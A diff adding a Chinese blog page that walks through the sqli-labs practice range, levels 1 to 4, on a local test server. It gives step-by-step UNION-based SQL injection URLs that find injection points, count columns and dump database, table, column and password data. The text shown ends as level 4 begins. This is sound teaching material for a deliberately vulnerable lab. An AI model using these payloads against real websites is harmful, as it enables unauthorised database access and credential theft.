@@ -1,0 +1,464 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title> - 梧桐漓染的博客</title><meta name="Description" content="桐漓的博客"><meta property="og:title" content="" />
+<meta property="og:description" content="Sqli-labs靶场实战 源码做了修改，把每关的sql语句打印出来方便学习： echo $sql.&quot;&lt;/br&gt;&quot;;，做" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/sqli-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" /><meta property="og:image" content="/logo.png"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="Lyrio&#39;s blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/logo.png"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Sqli-labs靶场实战 源码做了修改，把每关的sql语句打印出来方便学习： echo $sql.&quot;&lt;/br&gt;&quot;;，做"/>
+<meta name="application-name" content="Lyrio&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Lyrio&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="/sqli-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" /><link rel="prev" href="/sqlmap-getshell/" /><link rel="next" href="/rce%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/sqli-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98\/"
+        },"genre": "posts","wordcount":  2191 ,
+        "url": "\/sqli-labs%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98\/","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Lyrio"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('light' === 'light' || 'light' === 'dark' || 'light' === 'black') setTheme('light'), saveTheme('light'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"><i class='fas fa-fw fa-fan fa-spin'></i> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title=""><i class='fas fa-fw fa-fan fa-spin'></i>友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="#" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "false")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX"></h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Lyrio</a>
+                </span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2191 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="true">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前提知识">前提知识</a></li>
+    <li><a href="#第一关">第一关</a>
+      <ul>
+        <li><a href="#判断有无注入点">判断有无注入点</a></li>
+        <li><a href="#判断是数字型还是字符型">判断是数字型还是字符型</a></li>
+        <li><a href="#判断有哪些字段回显到页面的哪些地方">判断有哪些字段回显到页面的哪些地方</a>
+          <ul>
+            <li><a href="#判断该表有几个字段">判断该表有几个字段</a></li>
+            <li><a href="#判断页面有哪些回显点">判断页面有哪些回显点</a></li>
+          </ul>
+        </li>
+        <li><a href="#查询当前网站的数据库">查询当前网站的数据库</a></li>
+        <li><a href="#查询当前数据库下有哪些表">查询当前数据库下有哪些表</a></li>
+        <li><a href="#查询某个表下有哪些字段">查询某个表下有哪些字段</a></li>
+        <li><a href="#查询某个字段的值">查询某个字段的值</a></li>
+      </ul>
+    </li>
+    <li><a href="#第二关">第二关</a></li>
+    <li><a href="#第三关">第三关</a></li>
+    <li><a href="#第四关">第四关</a>
+      <ul>
+        <li><a href="#第五关">第五关</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="sqli-labs靶场实战" class="headerLink">
+    <a href="#sqli-labs%e9%9d%b6%e5%9c%ba%e5%ae%9e%e6%88%98" class="header-mark"></a>Sqli-labs靶场实战</h1><blockquote>
+<p>源码做了修改，把每关的sql语句打印出来方便学习：</p>
+<p><code>echo $sql.&quot;&lt;/br&gt;&quot;;</code>，做题时当作没看到</p>
+</blockquote>
+<h2 id="前提知识" class="headerLink">
+    <a href="#%e5%89%8d%e6%8f%90%e7%9f%a5%e8%af%86" class="header-mark"></a>前提知识</h2><ul>
+<li>
+<p>MySQL的查询语句是<code>SELECT * FROM 表名 WHERE 条件; --- 从某个表查询符合某个条件的所有数据</code>
+<code>*</code>可以换成你指定要查询的字段数据。</p>
+</li>
+<li>
+<p>在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个<code>information_schema</code>的数据库，在该库中，我们需要记住三个表名，分别是<code>schemata</code>，<code>tables</code>，<code>columns</code>。</p>
+<ul>
+<li>Schemata 表<strong>存储的是该用户创建的所有数据库的库名</strong>，需要记住该表中记录数据库名的字段名为 <code>schema_name</code>。</li>
+<li>Tables 表<strong>存储该用户创建的所有数据库的库名和表名</strong>，要记住该表中记录数据库 库名和表名的字段分别是 <code>table_schema</code>和 <code>table_name</code>。</li>
+<li>Columns 表<strong>存储该用户创建的所有数据库的库名、表名、字段名</strong>，要记住该表中记录数据库库名、表名、字段名为 <code>table_schema</code>、<code>table_name</code>、<code>columns_name</code>。</li>
+</ul>
+</li>
+<li>
+<p><code>union</code>：MySQL中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
+</li>
+<li>
+<p><code>group_concat()</code>：把数据分组连接(大概这么解释)。</p>
+</li>
+<li>
+<p><code>order by 数字</code>：<strong>把查询的数据按第n个字段排序。</strong></p>
+</li>
+<li>
+<p><code>Database()</code>：查询当前网站使用的数据库。</p>
+</li>
+</ul>
+<p>​</p>
+<p>​</p>
+<h2 id="第一关" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b8%80%e5%85%b3" class="header-mark"></a>第一关</h2><h3 id="判断有无注入点" class="headerLink">
+    <a href="#%e5%88%a4%e6%96%ad%e6%9c%89%e6%97%a0%e6%b3%a8%e5%85%a5%e7%82%b9" class="header-mark"></a>判断有无注入点</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1</code>页面正常</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64ceff441ddac507cc6062db.jpg" title="https://pic.imgdb.cn/item/64ceff441ddac507cc6062db.jpg" data-thumbnail="https://pic.imgdb.cn/item/64ceff441ddac507cc6062db.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64ceff441ddac507cc6062db.jpg"
+            srcset="https://pic.imgdb.cn/item/64ceff441ddac507cc6062db.jpg, https://pic.imgdb.cn/item/64ceff441ddac507cc6062db.jpg 1.5x, https://pic.imgdb.cn/item/64ceff441ddac507cc6062db.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64ceff441ddac507cc6062db.jpg">
+    </a></figure></p>
+<p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1%27</code>页面报错，说明存在注入点</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64ceff9a1ddac507cc61638a.jpg" title="https://pic.imgdb.cn/item/64ceff9a1ddac507cc61638a.jpg" data-thumbnail="https://pic.imgdb.cn/item/64ceff9a1ddac507cc61638a.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64ceff9a1ddac507cc61638a.jpg"
+            srcset="https://pic.imgdb.cn/item/64ceff9a1ddac507cc61638a.jpg, https://pic.imgdb.cn/item/64ceff9a1ddac507cc61638a.jpg 1.5x, https://pic.imgdb.cn/item/64ceff9a1ddac507cc61638a.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64ceff9a1ddac507cc61638a.jpg">
+    </a></figure></p>
+<p>上图可以看出网页将<code>1'</code>放到sql语句中，导致sql语句变成<code>SELECT * FROM users WHERE id='1'' LIMIT 0,1</code>，所以产生错误</p>
+<p>​</p>
+<h3 id="判断是数字型还是字符型" class="headerLink">
+    <a href="#%e5%88%a4%e6%96%ad%e6%98%af%e6%95%b0%e5%ad%97%e5%9e%8b%e8%bf%98%e6%98%af%e5%ad%97%e7%ac%a6%e5%9e%8b" class="header-mark"></a>判断是数字型还是字符型</h3><p>数字型的sql语句大概是：<code>SELECT * FROM users WHERE id=1 LIMIT 0,1</code></p>
+<p>字符型的sql语句大概是：<code>SELECT * FROM users WHERE id='1' LIMIT 0,1</code></p>
+<p>在看不到后端代码的情况下可以尝试：<code>http://127.0.0.1/sqli-labs/Less-1/?id=1'--+</code></p>
+<p>如果是数字型的sql语句会变成：<code>SELECT * FROM users WHERE id=1'--+ LIMIT 0,1</code>，<code>--+</code>是注释符，所以最终的sql语句会变成<code>SELECT * FROM users WHERE id=1'</code>，多个了<code>'</code>，页面还是报错</p>
+<p>如果是字符型的sql语句会变成：<code>SELECT * FROM users WHERE id='1'--+' LIMIT 0,1</code> =&gt; <code>SELECT * FROM users WHERE id='1'</code>，页面变回正常</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cf02561ddac507cc683048.jpg" title="https://pic.imgdb.cn/item/64cf02561ddac507cc683048.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cf02561ddac507cc683048.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64cf02561ddac507cc683048.jpg"
+            srcset="https://pic.imgdb.cn/item/64cf02561ddac507cc683048.jpg, https://pic.imgdb.cn/item/64cf02561ddac507cc683048.jpg 1.5x, https://pic.imgdb.cn/item/64cf02561ddac507cc683048.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64cf02561ddac507cc683048.jpg">
+    </a></figure></p>
+<p>由上图可以判断是字符型，接下来的步骤必须在要拼接的sql语句前加上<code>'</code>、后面加上<code>--+</code></p>
+<p>例如：<code>http://127.0.0.1/sqli-labs/Less-1/?id=1'order by 3--+</code></p>
+<p>​</p>
+<h3 id="判断有哪些字段回显到页面的哪些地方" class="headerLink">
+    <a href="#%e5%88%a4%e6%96%ad%e6%9c%89%e5%93%aa%e4%ba%9b%e5%ad%97%e6%ae%b5%e5%9b%9e%e6%98%be%e5%88%b0%e9%a1%b5%e9%9d%a2%e7%9a%84%e5%93%aa%e4%ba%9b%e5%9c%b0%e6%96%b9" class="header-mark"></a>判断有哪些字段回显到页面的哪些地方</h3><h4 id="判断该表有几个字段" class="headerLink">
+    <a href="#%e5%88%a4%e6%96%ad%e8%af%a5%e8%a1%a8%e6%9c%89%e5%87%a0%e4%b8%aa%e5%ad%97%e6%ae%b5" class="header-mark"></a>判断该表有几个字段</h4><p><code>order by</code>：把查询的数据按第n个字段排序。可以用它来判断<code>users</code>表一共有多少字段</p>
+<p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1'order by 3--+</code>页面正常回显，说明可以按第3个字段排序，也就是至少有3个字段</p>
+<p><code>http://127.0.0.1/sqli-labs/Less-1/?id=1'order by 4--+</code>页面报错，说明无法按第4个字段排序，由此可以得出该表只有3个字段</p>
+<h4 id="判断页面有哪些回显点" class="headerLink">
+    <a href="#%e5%88%a4%e6%96%ad%e9%a1%b5%e9%9d%a2%e6%9c%89%e5%93%aa%e4%ba%9b%e5%9b%9e%e6%98%be%e7%82%b9" class="header-mark"></a>判断页面有哪些回显点</h4><p>首先先让页面无回显，例如<code>?id=-1</code>(没有id=-1的数据)</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cf9f411ddac507cce5006b.jpg" title="https://pic.imgdb.cn/item/64cf9f411ddac507cce5006b.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cf9f411ddac507cce5006b.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64cf9f411ddac507cce5006b.jpg"
+            srcset="https://pic.imgdb.cn/item/64cf9f411ddac507cce5006b.jpg, https://pic.imgdb.cn/item/64cf9f411ddac507cce5006b.jpg 1.5x, https://pic.imgdb.cn/item/64cf9f411ddac507cce5006b.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64cf9f411ddac507cce5006b.jpg">
+    </a></figure></p>
+<p>使用联合查询<code>union select </code>：<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3--+</code></p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cfa0351ddac507cce83831.jpg" title="https://pic.imgdb.cn/item/64cfa0351ddac507cce83831.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cfa0351ddac507cce83831.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64cfa0351ddac507cce83831.jpg"
+            srcset="https://pic.imgdb.cn/item/64cfa0351ddac507cce83831.jpg, https://pic.imgdb.cn/item/64cfa0351ddac507cce83831.jpg 1.5x, https://pic.imgdb.cn/item/64cfa0351ddac507cce83831.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64cfa0351ddac507cce83831.jpg">
+    </a></figure></p>
+<p><code>union</code>的特性：左右两边查询语句的字段数必须相同，这也就是为什么上一步要去推测<code>users</code>表有几个字段</p>
+<p>由上图可以得出页面有两个回显点，分别是<code>2</code>和<code>3</code>的位置</p>
+<p>​</p>
+<h3 id="查询当前网站的数据库" class="headerLink">
+    <a href="#%e6%9f%a5%e8%af%a2%e5%bd%93%e5%89%8d%e7%bd%91%e7%ab%99%e7%9a%84%e6%95%b0%e6%8d%ae%e5%ba%93" class="header-mark"></a>查询当前网站的数据库</h3><p>随便选一个回显点来查询(2和3选一个)，例如<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,database(),3--+</code></p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cfa1431ddac507ccebbc93.jpg" title="https://pic.imgdb.cn/item/64cfa1431ddac507ccebbc93.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cfa1431ddac507ccebbc93.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64cfa1431ddac507ccebbc93.jpg"
+            srcset="https://pic.imgdb.cn/item/64cfa1431ddac507ccebbc93.jpg, https://pic.imgdb.cn/item/64cfa1431ddac507ccebbc93.jpg 1.5x, https://pic.imgdb.cn/item/64cfa1431ddac507ccebbc93.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64cfa1431ddac507ccebbc93.jpg">
+    </a></figure></p>
+<p>得到当前数据库名为<code>security</code></p>
+<p>​</p>
+<h3 id="查询当前数据库下有哪些表" class="headerLink">
+    <a href="#%e6%9f%a5%e8%af%a2%e5%bd%93%e5%89%8d%e6%95%b0%e6%8d%ae%e5%ba%93%e4%b8%8b%e6%9c%89%e5%93%aa%e4%ba%9b%e8%a1%a8" class="header-mark"></a>查询当前数据库下有哪些表</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+</code></p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cfa37d1ddac507ccf2a9ad.jpg" title="https://pic.imgdb.cn/item/64cfa37d1ddac507ccf2a9ad.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cfa37d1ddac507ccf2a9ad.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64cfa37d1ddac507ccf2a9ad.jpg"
+            srcset="https://pic.imgdb.cn/item/64cfa37d1ddac507ccf2a9ad.jpg, https://pic.imgdb.cn/item/64cfa37d1ddac507ccf2a9ad.jpg 1.5x, https://pic.imgdb.cn/item/64cfa37d1ddac507ccf2a9ad.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64cfa37d1ddac507ccf2a9ad.jpg">
+    </a></figure></p>
+<p>得到<code>security</code>库下有四个表：<code>emails</code>,<code>referers</code>,<code>uagernts</code>,<code>users</code></p>
+<p>​</p>
+<h3 id="查询某个表下有哪些字段" class="headerLink">
+    <a href="#%e6%9f%a5%e8%af%a2%e6%9f%90%e4%b8%aa%e8%a1%a8%e4%b8%8b%e6%9c%89%e5%93%aa%e4%ba%9b%e5%ad%97%e6%ae%b5" class="header-mark"></a>查询某个表下有哪些字段</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;--+</code></p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cfa53f1ddac507ccfa151b.jpg" title="https://pic.imgdb.cn/item/64cfa53f1ddac507ccfa151b.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cfa53f1ddac507ccfa151b.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64cfa53f1ddac507ccfa151b.jpg"
+            srcset="https://pic.imgdb.cn/item/64cfa53f1ddac507ccfa151b.jpg, https://pic.imgdb.cn/item/64cfa53f1ddac507ccfa151b.jpg 1.5x, https://pic.imgdb.cn/item/64cfa53f1ddac507ccfa151b.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64cfa53f1ddac507ccfa151b.jpg">
+    </a></figure></p>
+<p>得到<code>users</code>表下有这些字段</p>
+<p>​</p>
+<h3 id="查询某个字段的值" class="headerLink">
+    <a href="#%e6%9f%a5%e8%af%a2%e6%9f%90%e4%b8%aa%e5%ad%97%e6%ae%b5%e7%9a%84%e5%80%bc" class="header-mark"></a>查询某个字段的值</h3><p><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,password,3 from users--+</code></p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cfa5a61ddac507ccfb9dfb.jpg" title="https://pic.imgdb.cn/item/64cfa5a61ddac507ccfb9dfb.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cfa5a61ddac507ccfb9dfb.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64cfa5a61ddac507ccfb9dfb.jpg"
+            srcset="https://pic.imgdb.cn/item/64cfa5a61ddac507ccfb9dfb.jpg, https://pic.imgdb.cn/item/64cfa5a61ddac507ccfb9dfb.jpg 1.5x, https://pic.imgdb.cn/item/64cfa5a61ddac507ccfb9dfb.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64cfa5a61ddac507ccfb9dfb.jpg">
+    </a></figure></p>
+<p>得到<code>password</code>的值为：<code>Dumb</code></p>
+<p>​</p>
+<p>​</p>
+<h2 id="第二关" class="headerLink">
+    <a href="#%e7%ac%ac%e4%ba%8c%e5%85%b3" class="header-mark"></a>第二关</h2><p><code>http://127.0.0.1/sqli-labs/Less-2/?id=1'</code>报错，说明有注入点</p>
+<p><code>http://127.0.0.1/sqli-labs/Less-2/?id=1'--+</code>，还是报错，说明是数字型，接下来就不用加<code>'</code>来闭合了，只需要在后面加<code>--+</code>来注释掉后面的sql语句：<code>LIMIT 0,1</code></p>
+<p><code>http://127.0.0.1/sqli-labs/Less-2/?id=1 order by 3--+</code>，页面正常回显；<code>http://127.0.0.1/sqli-labs/Less-2/?id=1 order by 4--+</code>，页面报错，说明有3个字段</p>
+<p><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,2,3--+</code>，得到回显位置</p>
+<p><code>http://127.0.0.1/sqli-labs/Less-2/?id=-1 union select 1,database(),3--+</code>得到数据库名</p>
+<p>剩下步骤基本相同</p>
+<p>​</p>
+<p>​</p>
+<h2 id="第三关" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b8%89%e5%85%b3" class="header-mark"></a>第三关</h2><p><code>1'</code>页面报错，说明有注入点</p>
+<p><figure><a class="lightgallery" href="https://pic.imgdb.cn/item/64cfa98c1ddac507cc08f247.jpg" title="https://pic.imgdb.cn/item/64cfa98c1ddac507cc08f247.jpg" data-thumbnail="https://pic.imgdb.cn/item/64cfa98c1ddac507cc08f247.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic.imgdb.cn/item/64cfa98c1ddac507cc08f247.jpg"
+            srcset="https://pic.imgdb.cn/item/64cfa98c1ddac507cc08f247.jpg, https://pic.imgdb.cn/item/64cfa98c1ddac507cc08f247.jpg 1.5x, https://pic.imgdb.cn/item/64cfa98c1ddac507cc08f247.jpg 2x"
+            sizes="auto"
+            alt="https://pic.imgdb.cn/item/64cfa98c1ddac507cc08f247.jpg">
+    </a></figure></p>
+<p>并且通过报错信息得知是单引号字符型且用括号闭合</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;) order by 3--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">-1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="o">--+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;) union select 1,database(),version()--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">-1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;security&#39;</span><span class="o">--+</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39;--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">-1&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="nf">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="o">--+</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>​</p>
+<p>​</p>
+<h2 id="第四关" class="headerLink">
+    <a href="#%e7%ac%ac%e5%9b%9b%e5%85%b3" class="header-mark"></a>第四关</h2><p><code>1'</code>页面正常显示</p>
